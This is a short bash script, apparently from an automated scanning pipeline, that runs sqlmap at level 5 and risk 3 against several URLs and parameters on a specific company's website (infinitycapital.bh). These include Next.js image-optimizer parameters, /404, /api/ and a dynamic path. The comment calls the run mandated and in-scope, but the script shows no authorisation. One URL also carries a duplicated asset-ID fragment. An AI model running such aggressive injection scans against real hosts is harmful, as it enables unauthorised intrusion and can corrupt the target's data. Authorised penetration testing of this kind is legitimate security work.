#!/bin/bash
# Mandated sqlmap run against every discovered parameter (in-scope host only).
cd /var/lib/scanner/16e69f07-f908-482b-8fc5-492852a61a91/1f5fe7c8-5e28-45bc-8e08-a3e868bad87e/work
mkdir -p tool_outputs/sqlmap

IMGP="https://www.infinitycapital.bh/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2F1GCT0vyjqmOwm2OL1YVpD1%2F2ab55f8b5189afa153eac5cb97f7f6d4%2FAhmed_Taleb_updated-min.jpg&w=1080&q=75"

run () {
  name="$1"; url="$2"; shift 2
  echo "===== SQLMAP $name =====" 
  echo "URL: $url"
  timeout 300 sqlmap -u "$url" --batch --level=5 --risk=3 --threads=4 \
    --random-agent --timeout=15 --retries=1 --output-dir=tool_outputs/sqlmap \
    "$@" 2>&1 | tail -40
  echo
}

# 1) image optimizer: url, w, q  (all three together)
run "image_all_params" "$IMGP"
# 2) only w
run "image_w_only" "https://www.infinitycapital.bh/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2F1GCT0vyjqmOwm2OL1YVpD1%2F2ab55f8b5189afa153eac5cb97f7f6d4%2FAhmed_Taleb_updated-min.jpg&w=1080"
# 3) only q
run "image_q_only" "https://www.infinitycapital.bh/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2F1GCT0vyjqmOwmOwm2OL1YVpD1%2F2ab55f8b5189afa153eac5cb97f7f6d4%2FAhmed_Taleb_updated-min.jpg&q=75"
# 4) url only
run "image_url_only" "https://www.infinitycapital.bh/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2F1GCT0vyjqmOwm2OL1YVpD1%2F2ab55f8b5189afa153eac5cb97f7f6d4%2FAhmed_Taleb_updated-min.jpg&w=1080&q=75" -p url
# 5) /404 path
run "path_404" "https://www.infinitycapital.bh/404"
# 6) /api/ 
run "api_root" "https://www.infinitycapital.bh/api/"
# 7) \$p dynamic path segment
run "dollar_p" "https://www.infinitycapital.bh/\$p"

echo "ALL SQLMAP RUNS COMPLETE"
